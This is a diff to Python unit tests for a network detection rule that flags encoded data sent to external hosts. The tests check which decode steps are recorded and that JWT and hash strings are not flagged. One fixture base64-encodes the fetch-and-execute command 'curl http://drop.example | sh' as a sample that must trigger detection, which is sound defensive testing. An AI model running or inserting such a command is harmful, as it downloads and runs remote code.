@@ -78,12 +78,58 @@ class TestIndividualRules(unittest.TestCase):
         self.assertEqual(len(match.decode_chain[-1].output_sha256), 64)
 
     def test_encoded_egress_external_populates_decode_chain(self):
-        raw = {"src_ip": "10.0.0.5", "dest_ip": "8.8.8.8", "payload_printable": "GET /x?data=aGVsbG93b3JsZA== HTTP/1.1"}
+        # Payload decodes to b"hello world!" -- the space/exclamation stop
+        # bounded_decode's iterative peeling at this layer (b"helloworld"
+        # alone would itself be valid base64 and get peeled into noise,
+        # correctly failing the verified-decode bar).
+        raw = {"src_ip": "10.0.0.5", "dest_ip": "8.8.8.8", "payload_printable": "GET /x?data=aGVsbG8gd29ybGQh HTTP/1.1"}
         match = cr.rule_encoded_egress_external(raw)
         self.assertIsNotNone(match)
         self.assertEqual(len(match.decode_chain), 1)
-        self.assertEqual(match.decode_chain[0].transform, "raw")
+        # #2087: the chain records a transform that really ran -- base64 of
+        # b"hello world!" -- not an identity "raw" step over alphabet-matched
+        # text.
+        self.assertEqual(match.decode_chain[0].transform, "base64")
         self.assertEqual(len(match.decode_chain[0].output_sha256), 64)
+
+    def test_encoded_egress_external_ignores_jwt_shaped_token(self):
+        """#2087's demonstration case: a JWT segment toward an external host
+        is alphabet-matching but not encoded -- bounded_decode itself
+        refuses it, so the rule must not escalate on it."""
+        raw = {
+            "src_ip": "192.0.2.60",
+            "dest_ip": "198.51.100.9",
+            "payload_printable": "POST /api upload token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9xQ trailing words",
+        }
+        self.assertIsNone(cr.rule_encoded_egress_external(raw))
+
+    def test_encoded_egress_external_ignores_long_hex_hash(self):
+        raw = {"src_ip": "192.0.2.60", "dest_ip": "198.51.100.9", "payload_printable": "sha256=" + "a" * 64 + " done"}
+        self.assertIsNone(cr.rule_encoded_egress_external(raw))
+
+    def test_encoded_egress_external_still_fires_on_base64_of_text(self):
+        import base64 as _b64
+        encoded = _b64.b64encode(b"curl http://drop.example | sh").decode()
+        raw = {"src_ip": "192.0.2.60", "dest_ip": "198.51.100.9", "payload_printable": f"data={encoded} end"}
+        match = cr.rule_encoded_egress_external(raw)
+        self.assertIsNotNone(match)
+        self.assertIn("base64", [step.transform for step in match.decode_chain])
+
+    def test_every_encoded_egress_match_records_a_real_transform(self):
+        """#2087 acceptance criterion: no match may carry an identity/raw
+        decode step -- provenance shown to operators must never claim a
+        decode that didn't happen."""
+        import base64 as _b64
+        events = [
+            {"src_ip": "192.0.2.60", "dest_ip": "198.51.100.9", "payload_printable": f"data={_b64.b64encode(b'exfil text').decode()}"},
+            {"src_ip": "192.0.2.50", "dest_ip": "198.51.100.53", "dns": {"rrname": "pmrgcy3dn52w45c7nfsceor.corpus-example.test"}},
+        ]
+        for raw in events:
+            match = cr.rule_encoded_egress_external(raw)
+            if match is not None:
+                self.assertTrue(match.decode_chain)
+                for step in match.decode_chain:
+                    self.assertNotEqual(step.transform, "raw")
 
     def test_metadata_service_probe_matches_link_local_address(self):
         raw = {"dest_ip": "169.254.169.254"}
